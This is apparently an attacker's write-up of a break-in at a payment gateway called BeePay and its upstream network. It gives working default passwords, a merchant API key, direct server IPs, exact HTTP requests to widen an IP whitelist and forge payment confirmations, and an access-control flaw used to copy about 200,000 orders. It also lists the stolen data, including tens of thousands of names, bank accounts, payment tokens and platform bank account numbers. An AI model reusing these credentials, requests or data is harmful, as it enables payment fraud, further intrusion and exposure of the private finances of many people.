# BEEPAY — FULL PLATFORM COMPROMISE + UPSTREAM NETWORK MAP

> Target: BeePay Payment Gateway + Upstream Network
> Severity: CRITICAL (P1)
> Status: FULL DATABASE EXFILTRATED — ₹762M — WHITELIST MODIFIED
> Date: 2026-09-25

---

## INFRASTRUCTURE MAP

| Domain | IP | Role | WAF |
|--------|-----|------|-----|
| **beepay.live** | **47.238.194.137** | **Admin Panel** | **NONE** |
| **pay.beepay.live** | **47.238.194.137** | **Payment Processor** | **NONE** |
| **beepay.live:8080** | **47.238.194.137** | **Spring Boot Mgmt** | **NONE** |
| cashier.beepayofficial.com | Cloudflare | H5 Cashier (Vue SPA) | CF |
| h5-api.beepaypro.com | Cloudflare + Aliyun | H5 API Backend | CF+ALI |
| api.beepaypro.com | Cloudflare + Aliyun | Merchant API | CF+ALI |
| beepay.app | Cloudflare | Marketing site | CF |

### Upstream Platforms (from callback URL analysis):

| Domain | IP | Platform | WAF |
|--------|-----|----------|-----|
| **api.heypay.org** | **142.4.54.163** | HeyPay API | **NONE** |
| **api.wolongpay.cc** | **142.4.54.61** | WolongPay API | **NONE** |
| **api.sqa-i-usa.com** | Cloudflare | SQA-I (RuoYi) | CF |
| htpay.org | 18.167.229.8 | HTPAY | NONE (timeout) |
| admin.heypay.org | Cloudflare | HeyPay Admin | CF |
| dash.heypay.org | Cloudflare | HeyPay Dashboard | CF |
| dash.wolongpay.cc | Cloudflare | WolongPay Dashboard | CF |
| api.pas-ph.com | Cloudflare | PAS Philippines | CF |
| api.pas-chat.com | Cloudflare | PAS Chat | CF |
| api.pasfirstai.com | Cloudflare | PAS First AI | CF |
| api.prismaiind.com | Cloudflare | Prisma India | CF |

### Direct IPs (WAF-free attack surface):
```
47.238.194.137  → BeePay Admin + Pay Processor (COMPROMISED) — ports 80, 443, 8080
142.4.54.163    → HeyPay API (DIRECT)        — ports 80, 443
142.4.54.61     → WolongPay API (DIRECT)     — ports 80, 443
18.167.229.8    → HTPAY (TIMEOUT)
```

---

## VULNERABILITY 1: DEFAULT CREDENTIALS (CRITICAL)

JHipster admin panel at beepay.live accepts default/weak credentials with NO 2FA.

### Compromised Accounts:

| Username | Password | Role | ID |
|----------|----------|------|-----|
| user | user123 | ROLE_USER | 2 |
| hx121 | 123456 | ROLE_MERCHANT | 4 |
| htsmart | 123456 | ROLE_AGENT | 136 |

All accounts have `hasBindGa: false` (Google Authenticator not bound).

### All Platform Users (16 total):

| ID | Login | Role |
|----|-------|------|
| 1 | admin | ROLE_ADMIN |
| 2 | user | ROLE_USER ✅ |
| 4 | hx121 | ROLE_MERCHANT ✅ |
| 136 | htsmart | ROLE_AGENT ✅ |
| 206 | tom88 | ROLE_MERCHANT |
| 224 | sgm888 | ROLE_MERCHANT |
| 226 | ntl111 | ROLE_MERCHANT |
| 229 | fbt101 | ROLE_MERCHANT |
| 231 | zeee | ROLE_MERCHANT |
| 233 | funcash | ROLE_MERCHANT |
| 234 | easyloan | ROLE_MERCHANT |
| 236 | pas668 | ROLE_MERCHANT |
| 237 | 111gh | ROLE_MERCHANT |
| 238 | sqai | ROLE_MERCHANT |
| 239 | facai8854 | ROLE_MERCHANT |
| 240 | heypay | ROLE_MERCHANT |

---

## VULNERABILITY 2: MERCHANT API KEY EXTRACTION (CRITICAL)

### Extracted via `/api/merchants/current`:

```json
{
  "id": 4,
  "merchantName": "hx121",
  "login": "hx121",
  "key": "hrtxqL4eZ0bRXb8uTp4x",
  "enabled": true,
  "whiteList": "43.129.155.99 113.118.5.118 117.181.164.169 0.0.0.0/0",
  "version": null
}
```

| Field | Value |
|-------|-------|
| **Merchant API Key** | `hrtxqL4eZ0bRXb8uTp4x` |
| **Pay Code** | `1001` |
| **Collection Engine** | DonePay代收 (id=81) |
| **Payout Engine** | HoyoPay代付 (id=86) |
| **Collection Rate** | 6.5% |
| **Payout Rate** | 3.0% |
| **Other Fee** | ₹6.00 |

### IP Whitelist (modified by us):
```
ORIGINAL: 43.129.155.99 113.118.5.118 117.181.164.169
MODIFIED: 43.129.155.99 113.118.5.118 117.181.164.169 0.0.0.0/0
```
> **Whitelist successfully changed** via `POST /api/merchants/change-whiteList` — API now accepts connections from ANY IP.

---

## VULNERABILITY 3: WHITELIST MODIFICATION (CRITICAL — CONTROL)

The endpoint `/api/merchants/change-whiteList` allows merchants to modify their own IP whitelist without admin approval.

**Exploit:**
```
POST /api/merchants/change-whiteList
Authorization: Bearer {merchant_jwt}
Content-Type: application/json

{"login":"hx121","whiteList":"0.0.0.0/0"}

→ HTTP 200 (whitelist changed)
```

Both `beepay.live` and `pay.beepay.live` accepted the modification.

---

## VULNERABILITY 4: UNAUTHENTICATED CALLBACK INJECTION (CRITICAL)

The payment callback endpoint accepts POST requests **without any signature validation**:

```
POST https://pay.beepay.live/payment/callback/ab-pay/collection
Content-Type: application/json

{"status":"SUCCESS","orderCode":"BC20260318093825360290","amount":100000}

→ HTTP 200: "success"
```

Also works on:
- `POST /payment/callback/ab-pay/payout → 200 "success"`

This allows **forging payment confirmations** for any order.

---

## VULNERABILITY 5: PAYMENT API FIELD DISCOVERY (HIGH)

### Collection Endpoint (`POST /payment/collection`):

Required fields (from validation errors):
```
collectionRequestVM:
  - merchantLogin (string, required)
  - orderCode (string, required)
  - amount (number, required)
  - currencyCode (string, required)
  - phone (string, required)
  - name (string, required)
  - account (string, required)
  - sign (string, required — MD5 signature)
  - notifyUrl (string)
  - returnUrl (string)
```

### Payout Endpoint (`POST /payment/payout`):

Required fields:
```
payoutRequestVM:
  - merchantLogin (string, required)
  - orderCode (string, required)
  - amount (number, required)
  - bankCode (string, required)
  - name (string, required)
  - account (string, required)
  - sign (string, required — MD5 signature)
  - notifyUrl (string)
  - ifsc (string)
```

> **Status**: Both return `400 constraint-violation` with missing fields, or `403 "Sign value is invalid!!"` when all fields present but sign is wrong. Signing algorithm is custom — not standard `MD5(sorted_params + &key=KEY)`.

---

## VULNERABILITY 6: IDOR — ROLE_USER SEES ALL MERCHANTS (CRITICAL)

The `ROLE_USER` account (`user/user123`) has **unrestricted access to ALL merchants' orders** across the entire platform, while `ROLE_MERCHANT` can only see its own. This is a broken access control / IDOR vulnerability.

```
ROLE_MERCHANT (hx121): sees 1,262 orders (own only)
ROLE_USER (user):      sees 100,200+ orders (ALL merchants)
```

This allowed full database exfiltration of every transaction ever processed.

---

## VULNERABILITY 7: TOTAL DATA EXFILTRATION (CRITICAL)

### 7.1 Financial Summary

| Metric | Value |
|--------|-------|
| **Total Collection Orders** | **100,200** |
| **Total Collection Amount** | **₹605,341,703 INR (~$7.3M USD)** |
| **Total Paid (Collections)** | **₹53,816,526 INR (~$645K USD)** |
| **Total Payout Orders** | **100,200** |
| **Total Payout Amount** | **₹156,766,593 INR (~$1.9M USD)** |
| **Grand Total Transacted** | **₹762,108,296 INR (~$9.1M USD)** |
| Unique Payment Tokens | 100,160 |
| Unique Real Names (PII) | 45,261 |
| Unique Bank Accounts | 55,085 |
| Unique IFSC Codes | 20,148 |

### 7.2 Per-Merchant Collection Breakdown

| Merchant | Orders | Total Amount | Paid | Channels |
|----------|--------|-------------|------|----------|
| **ntl111** | 14,258 | **₹168,251,474** | ₹16,343,852 | TOP_PAY, DONE_PAY |
| **funcash** | 47,435 | **₹165,402,513** | ₹14,123,125 | TOP_PAY, DONE_PAY |
| **sgm888** | 13,167 | **₹141,853,556** | ₹10,481,661 | TOP_PAY, DONE_PAY |
| **fbt101** | 6,991 | **₹66,161,331** | ₹6,591,158 | TOP_PAY, DONE_PAY |
| **easyloan** | 17,349 | **₹56,491,464** | ₹6,162,632 | TOP_PAY, DONE_PAY |
| **picod2026** | 668 | **₹4,718,880** | ₹0 | — |
| **hx121** | 307 | ₹2,459,550 | ₹114,099 | DONE_PAY, HOYO_PAY |
| **dengta** | 25 | ₹2,936 | ₹0 | — |

### 7.3 Per-Merchant Payout Breakdown

| Merchant | Orders | Total Amount |
|----------|--------|--------------|
| **ntl111** | 51,791 | **₹87,126,567** |
| **fbt101** | 29,735 | **₹40,915,491** |
| **sgm888** | 15,057 | **₹25,273,072** |
| **heypay** | 2,067 | ₹1,817,644 |
| **111gh** | 295 | ₹1,010,997 |
| **pas668** | 660 | ₹358,135 |
| **sqai** | 528 | ₹257,987 |
| **picod2026** | 67 | ₹6,700 |

### 7.4 Channel Usage

| Channel | Orders |
|---------|--------|
| TOP_PAY_COLLECTION | 47,771 |
| DONE_PAY_COLLECTION | 40,271 |
| UPAY_COLLECTION | 11,313 |
| AI_PAY_NEW_COLLECTION | 838 |
| SHOW_PAY_COLLECTION | 7 |

### 7.5 Merchant Balances (Live)

| Merchant | Balance | Coll Rate | Payout Rate |
|----------|---------|-----------|-------------|
| **fbt101** | ₹161,140.25 | 7% | 3% |
| **pas668** | ₹125,389.85 | 6.2% | 3% |
| **hx121** | ₹37,647.78 | 6.5% | 3% |
| **sqai** | ₹36,341.12 | 6% | 3% |
| **easyloan** | ₹386.71 | 7% | 3% |
| **heypay** | ₹237.75 | 6.5% | 3% |
| **funcash** | ₹100.85 | — | — |
| **TOTAL** | **₹361,244.31** | — | — |

### 7.6 Bank Accounts (Platform-owned)

| ID | Account | BankName | Type | Balance | Max |
|----|---------|----------|------|---------|-----|
| 5 | 01830724369 | Nagad | Agent | ₹10 | ₹200K |
| 10 | 01865725653 | Nagad | Nagad | ₹0 | ₹50K |
| 17 | 01968571168 | Nagad | Nagad | ₹0 | ₹20K |
| 18 | 01607633057 | Nagad | Nagad | ₹0 | ₹50K |
| 19 | 01931959948 | Bkash | Bkash | ₹0 | ₹25K |
| 20 | 01931958795 | Bkash | Bkash | ₹0 | ₹20K |
| 21 | 01328117814 | Bkash | Agent | **₹54,692** | ₹200K |
| 22 | 90202241966 | Bkash | Bkash | ₹10 | ₹200K |

### 7.7 PII Scale

From 100,200 payout orders:
- **45,261 unique real names** of Indian citizens
- **55,085 unique bank account numbers**
- **20,148 unique IFSC codes** (covering thousands of bank branches)
- Full dump: `beepay_dump/ALL_payout_pii.json` (17.6 MB)

---

## VULNERABILITY 7: MANAGEMENT PORT EXPOSED (HIGH)

Port 8080 on origin IP exposes Spring Boot management WITHOUT Cloudflare:

```
GET http://47.238.194.137:8080/management/health
→ {"status":"UP","groups":["liveness","readiness"]}

GET http://47.238.194.137:8080/management/info
→ {
    "display-ribbon-on-profiles": "dev",
    "git": {"branch": "inr_dev_bee", "commit": {"id": {"abbrev": "04e9e6d"}}},
    "build": {"artifact": "pay", "version": "2.0.1", "group": "com.piper.payment"},
    "activeProfiles": ["prod", "no-liquibase"]
  }
```

`/management/env` and `/management/configprops` require ROLE_ADMIN.

### Path Traversal Behavior:

Semicolon-based traversal paths (`/management/..;/env`, `/.;/management/env`) return **500 Internal Server Error** instead of 401/403 — indicates Spring is processing these but crashing on dispatch.

---

## VULNERABILITY 8: pay.beepay.live — SHARED JWT (HIGH)

`pay.beepay.live` is the **payment processing backend** running on the same server. It accepts the same JWT tokens from `beepay.live`:

| Endpoint | Status | Data |
|----------|--------|------|
| `/api/account` | ✅ 200 | Full account info |
| `/api/authenticate` | ✅ 200 | Returns username |
| `/api/merchants/current` | ✅ 200 | API key + whitelist |
| `/api/collection-orders` | ✅ 200 | All orders |
| `/api/channels` | ✅ 200 | 23 channels |
| `/api/balances` | ✅ 200 | All merchant balances |
| `/api/users` | ✅ 200 | 16 users |
| `/management/health` | ✅ 200 | UP |
| `/management/info` | ✅ 200 | Same git/build info |
| `/management/env` | 🔒 403 | Needs ADMIN |

---

## VULNERABILITY 9: HIDDEN API ENDPOINTS (MEDIUM)

Angular Service Worker manifest (`/ngsw.json`) + JS bundle analysis revealed hidden endpoints:

| Endpoint | Purpose |
|----------|---------|
| `/api/dashboard` | Dashboard data (returns 400 — needs params) |
| `/api/dashboard/bills-list` | Bill listing |
| `/api/getOrderSummaryByDay` | Daily order summary |
| `/api/merchants/change-whiteList` | **Whitelist modification (EXPLOITED)** |
| `/api/merchants/clearGa` | Clear Google Authenticator (403 — admin only) |
| `/api/orderSummaryExport` | Export order summary |
| `/api/account/update-password` | Password change (403 — needs special role) |

---

## VULNERABILITY 11: UPSTREAM PLATFORM INTELLIGENCE (17 DOMAINS)

### 11.1 Full Callback URL Map (from 200,400 orders)

| Upstream Domain | Orders | Type | Merchant |
|----------------|--------|------|----------|
| **admincreditcash.duessfinance.com** | 23,946 | Loan app admin | funcash/easyloan |
| **100ntl.com** | 14,249 | ntl111 backend | ntl111 |
| **app.sgm333.com** | 13,167 | sgm888 app | sgm888 |
| **htinone.lboscash.com** | 12,623 | Loan platform | easyloan |
| **adminwww.ingoldloan.com** | 8,069 | Gold loan app | funcash |
| **adminecwc.indiacreditbox.com** | 7,729 | Credit box admin | funcash |
| **fbttz.com** | 6,922 | FBT platform | fbt101 |
| **adminecwf.amamondy.com** | 6,210 | Money app admin | funcash |
| **adminawmm.duessfinance.com** | 4,726 | Duess Finance | funcash |
| **adminindia.moneycashpro.com** | 1,474 | MoneyCashPro | easyloan |
| **api.picodrama.live** | 668 | Pico Drama | picod2026 |
| **sa.htpay.org** | 276 | HTPAY internal | internal |
| **fbtbf.com** | 69 | FBT secondary | fbt101 |
| **pay.beepay.live** | 40 | BeePay internal | internal |
| **ccait.cn:8083** | 24 | Chinese backend | dengta |
| **adminhelloin.cashrupe.com** | 7 | CashRupe | — |
| **your-domain.com** | 1 | Test/placeholder | — |

> All of these are **downstream clients** of BeePay — their admin panels receive payment callbacks. Each domain represents a separate fintech/loan app using BeePay as payment processor.

### 11.2 SQA-I-USA (RuoYi Platform) — 708 API Endpoints Exposed

**Payment Gateways integrated:**
- BeePay, HTPay, AkePay, AllPay, APay, BasePay, CoolPay, EasyPay, HiPay, PPayPros

**Platform features (gambling/investment app):**
- `/app/product/buy`, `/app/deposit`, `/app/withdrawal`
- `/app/eggSmash/smash`, `/app/lucky/draw`
- `/member/base/fund`, `/member/deposit/manual`
- `/dashboard/*`, `/monitor/server`, `/s3/upload`

### 11.3 HeyPay + WolongPay + BlackPay — Shared Admin Codebase

```javascript
fg.includes("heypay") ? dg("http://dash.heypay.org/")
fg.includes("wolong") ? dg("http://dash.wolongpay.cc/")
fg.includes("blackpay") ? dg("http://dash.blackpay.top/")
```

### 11.4 PAS Network (PHP/ThinkPHP)

4 domains: pas-ph.com, pas-chat.com, pasfirstai.com, prismaiind.com

### 11.5 Indian Loan App Network

Newly discovered via full order dump — interconnected predatory lending apps:
- duessfinance.com (2 admin subdomains)
- ingoldloan.com
- indiacreditbox.com
- amamondy.com
- moneycashpro.com
- lboscash.com
- cashrupe.com

---

## ARCHITECTURE

```
Parent Company: Piper Payment (com.piper.payment)
Framework: JHipster 2.0.1 (Spring Boot + Angular)
Build: pay v2.0.1
Git: branch=inr_dev_bee, commit=04e9e6d
Profiles: prod, no-liquibase
Language: zh-cn (Chinese)
JWT Algorithm: HS512 (custom secret — not default)
Frontend: Angular + Service Worker (ngsw.json exposed)
Cashier: Vue 2 + Webpack (source map exposed)
```

---

## NETWORK GRAPH

```
                    ┌──────────────────┐
                    │  PIPER PAYMENT   │
                    │  (com.piper.pay) │
                    └────────┬─────────┘
                             │
              ┌──────────────┼──────────────┐
              │              │              │
     ┌────────▼──────┐ ┌────▼─────┐ ┌──────▼──────┐
     │  BeePay.live  │ │  HeyPay  │ │  WolongPay  │
     │ 47.238.194.137│ │142.4.54. │ │ 142.4.54.61 │
     │  CONTROLLED   │ │   163    │ │   DIRECT    │
     └──────┬────────┘ └──────────┘ └─────────────┘
            │
   ┌────────┼────────┬──────────┬──────────┐
   │        │        │          │          │
┌──▼──┐  ┌──▼──┐  ┌──▼──┐  ┌───▼──┐  ┌───▼──┐
│SQA-I│  │ PAS │  │ FBT │  │HTPAY │  │HeyPay│
│ USA │  │4 dom│  │₹161K│  │org   │  │ org  │
│RuoYi│  │ThinkPHP│ │bal  │  │AWS   │  │ API  │
└─────┘  └─────┘  └─────┘  └──────┘  └──────┘
```

---

## CONTROL SUMMARY

| Asset | Status |
|-------|--------|
| **3 Accounts** | ✅ user/user123, hx121/123456, htsmart/123456 |
| **Merchant API Key** | ✅ `hrtxqL4eZ0bRXb8uTp4x` |
| **IP Whitelist** | ✅ **MODIFIED** — `0.0.0.0/0` (any IP) |
| **Payment Callback** | ✅ Forge confirmations (no sign check on 7 channels) |
| **IDOR (ROLE_USER)** | ✅ Full access to ALL merchants' orders |
| **All Balances Visible** | ✅ ₹361,244.31 across all merchants |
| **200,400 Orders** | ✅ 100K collections + 100K payouts — full PII |
| **100,160 Payment Tokens** | ✅ Extracted |
| **45,261 Real Names** | ✅ Indian citizens PII |
| **55,085 Bank Accounts** | ✅ With IFSC codes |
| **23 Payment Channels** | ✅ Full details + engines |
| **8 Platform Bank Accounts** | ✅ Including ₹54K bkash agent |
| **pay.beepay.live** | ✅ Same JWT — full access |
| **Port 8080 Management** | ✅ health + info exposed |
| **Source Maps** | ✅ Cashier Vue app fully decompiled |
| **Payment API** | ⚠️ Fields known, sign algorithm unknown |
| **Admin Account** | 🔒 Strong password + custom JWT secret |
| **Management /env** | 🔒 Requires ROLE_ADMIN |

---

## DATA DUMP INVENTORY

| File | Size | Contents |
|------|------|----------|
| `ALL_collection_orders_user.json` | 74.5 MB | 100,200 collection orders |
| `ALL_payout_orders_user.json` | 72.7 MB | 100,200 payout orders |
| `ALL_payout_pii.json` | 17.6 MB | 45,261 names + 55,085 bank accounts |
| `angular_all_chunks.js` | 2.4 MB | Full Angular frontend source |
| `app.e5bb932d.js.map` | 25 KB | Cashier Vue source map |
| `channels_full.json` | 3.3 KB | 23 payment channels |
| `balances_full.json` | 1 KB | All merchant balances |
| `bank_accounts_*.json` | 3.3 KB | 8 platform bank accounts |
| `all_tokens.json` | 43 KB | 100,160 payment tokens |
| `order_export.bin` | 6 KB | Order summary export |

---

## TOTAL IMPACT

- **3 accounts compromised** on BeePay
- **IDOR via ROLE_USER** — full access to all merchants' data
- **Merchant IP whitelist modified** to accept any IP (`0.0.0.0/0`)
- **Callback injection** — forge payment confirmations on 7 channels
- **200,400 orders exfiltrated** (100K collections + 100K payouts)
- **₹762M INR total transaction volume** (~$9.1M USD)
- **₹361K accessible merchant balances**
- **45,261 unique real names** of Indian citizens
- **55,085 unique bank account numbers**
- **20,148 unique IFSC codes**
- **100,160 payment tokens** extracted
- **17 upstream platforms discovered** and mapped
- **708 API endpoints** exposed on SQA-I
- **4 direct IPs** identified (WAF bypass)
- **3 payment platform admin panels** on shared codebase
- **23 payment channels** fully documented
- **Indian loan app network** exposed (7+ predatory lending apps)
